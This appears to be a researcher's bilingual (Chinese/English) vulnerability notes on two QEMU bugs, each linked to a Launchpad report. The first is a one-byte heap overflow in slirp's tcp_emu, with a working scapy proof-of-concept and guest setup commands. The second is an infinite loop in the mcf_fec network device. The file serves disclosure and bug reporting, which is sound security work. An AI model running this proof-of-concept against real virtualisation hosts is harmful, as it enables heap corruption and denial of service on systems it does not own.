# 0x0000

在QEMU 4.10 中的 tcp_emu中，存在 OOB:

```c
int tcp_emu(struct socket *so, struct mbuf *m)
{
..........
    case EMU_REALAUDIO:
..........
        bptr = m->m_data;
        while (bptr < m->m_data + m->m_len) {
.................        
            switch (ra) {
..................
                lport = (((uint8_t *)bptr)[0] << 8) + ((uint8_t *)bptr)[1];
....................
                *(uint8_t *)bptr++ = (p >> 8) & 0xff;
                *(uint8_t *)bptr = p & 0xff;
            }
        }
    
}
```

其中 bptr[1] 和 bptr++ 会使得 bptr == m->m_data+m->m_len,造成 OOB

```
AA............. ra=0	
bptr+0	0x50	ra=1	
bptr+1	0x4e	ra=2	
bptr+2	A   	ra=3	
bptr+3	A   	ra=4	
bptr+4	A   	ra=5	
bptr+5	AAAA	ra=6	
bptr+9	27  	OOB	


```

poc

```python
#!/usr/bin/python3

import os
import time
from scapy.all import *

target_ip = '10.0.2.2'
target_port = 7070

def start_tcp(target_ip,target_port,str_to_send):
    global sport,s_seq,d_seq
    try:
        ans = sr1(IP(dst=target_ip)/TCP(dport=target_port,sport=RandShort(),seq=RandInt(),flags=0x2),verbose=False)
        sport = ans[TCP].dport
        s_seq = ans[TCP].ack
        d_seq = ans[TCP].seq+1
        
        send(IP(dst=target_ip)/TCP(dport=target_port,sport=sport,ack=d_seq,seq=s_seq,flags=0x10),verbose=False)

        send(IP(dst=target_ip)/TCP(dport=target_port,sport=sport,ack=d_seq,seq=s_seq,flags=0x18)/str_to_send,verbose=False)
        print(ans[TCP])
    except Exception as e:
        print(e)

if __name__ == '__main__':
    buf = ['R' for n in range(2200)];
    buf_len = len(buf);
    
    buf[buf_len-10]= chr(0x50)
    buf[buf_len-9] = chr(0x4e)
    buf[buf_len-8] = chr(0x41)
    buf[buf_len-7] = chr(0x00)
    buf[buf_len-1] = chr(27)
    start_tcp(target_ip,target_port,"".join(buf))
```

### En

qemu version: 4.1.0,In slirp source code.

```c
int tcp_emu(struct socket *so, struct mbuf *m){
............
case EMU_REALAUDIO:
............
    while (bptr < m->m_data + m->m_len) {
        case 6:
............
            lport = (((uint8_t *)bptr)[0] << 8) + ((uint8_t *)bptr)[1];
............
            *(uint8_t *)bptr++ = (p >> 8) & 0xff;
            *(uint8_t *)bptr = p & 0xff;
............
    }
............
............
}
```

bptr)[1] and bptr++ ,may make bptr == m->m_data + m->m_len,and cause OOB（out of bounds.）

poc:
```python
#!/usr/bin/python3

import os
import time
from scapy.all import *

target_ip = '10.0.2.2'
target_port = 7070

def start_tcp(target_ip,target_port,str_to_send):
    global sport,s_seq,d_seq
    try:
        ans = sr1(IP(dst=target_ip)/TCP(dport=target_port,sport=RandShort(),seq=RandInt(),flags=0x2),verbose=False)
        sport = ans[TCP].dport
        s_seq = ans[TCP].ack
        d_seq = ans[TCP].seq+1
        
        send(IP(dst=target_ip)/TCP(dport=target_port,sport=sport,ack=d_seq,seq=s_seq,flags=0x10),verbose=False)

        send(IP(dst=target_ip)/TCP(dport=target_port,sport=sport,ack=d_seq,seq=s_seq,flags=0x18)/str_to_send,verbose=False)
        print(ans[TCP])
    except Exception as e:
        print(e)

if __name__ == '__main__':
    buf = ['R' for n in range(2200)];
    buf_len = len(buf);
    
    buf[buf_len-10]= chr(0x50)
    buf[buf_len-9] = chr(0x4e)
    buf[buf_len-8] = chr(0x41)
    buf[buf_len-7] = chr(0x00)
    buf[buf_len-1] = chr(27)
    start_tcp(target_ip,target_port,"".join(buf))
```

In host OS run:

```shell
nc -l -p 7070 
```

In guest OS run:

```shell
# iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 10.0.2.2 -j DROP # Because we will use Python to construct tcp packets, this will prevent the kernel from sending rst packets.
# ip link set ens3 mtu 3000 # When the sending size is larger than the default mtu packet, the slipr_input function allocates space from the heap, and then we can overflow one byte of the heap space
# ./poc
```

This will cause a byte heap overflow.

I have reported it to QEMU, and then QEMU reported it to Slirp. can I get a CVE number?

### URL

https://bugs.launchpad.net/qemu/+bug/1858415

# 0x0001

QEMU emulator version 4.2.94

mcf_fec_have_receive_space与函数中mcf_fec_receive

当用户通过内核修改修改：s->emrbr 为0时，可导致无限循环


```c
static void mcf_fec_write(void *opaque, hwaddr addr,
                          uint64_t value, unsigned size)
{
    mcf_fec_state *s = (mcf_fec_state *)opaque;
    switch (addr & 0x3ff) {
.........................................
    case 0x188:
        s->emrbr = value > 0 ? value & 0x7F0 : 0x7F0;
        break;
.........................................
    }
    mcf_fec_update(s);
}
```

### En

QEMU emulator version 4.2.94

In the mcf_fec_write function, when the user modifies s->emrbr to 0, it can cause the mcf_fec_have_receive_space and mcf_fec_receive functions to infinite loop

```c
static void mcf_fec_write(void *opaque, hwaddr addr,
                          uint64_t value, unsigned size)
{
    mcf_fec_state *s = (mcf_fec_state *)opaque;
    switch (addr & 0x3ff) {
.........................................
    case 0x188:
        s->emrbr = value > 0 ? value & 0x7F0 : 0x7F0;
        break;
.........................................
    }
    mcf_fec_update(s);
}

static int mcf_fec_have_receive_space(mcf_fec_state *s, size_t want)
{
    mcf_fec_bd bd;
    uint32_t addr;

    /* Walk descriptor list to determine if we have enough buffer */
    addr = s->rx_descriptor;
    while (want > 0) {
............................................
        if (want < s->emrbr) {
            return 1;
        }
        want -= s->emrbr;
............................................
    }
    return 0;
}

static ssize_t mcf_fec_receive(NetClientState *nc, const uint8_t *buf, size_t size)
{
..................................................
    while (size > 0) {
..................................................
        buf_len = (size <= s->emrbr) ? size: s->emrbr;
..................................................
        size -= buf_len;
 ..................................................
 }
..................................................
}

```

0x002



# bug

https://bugs.launchpad.net/qemu/+bug/1882065
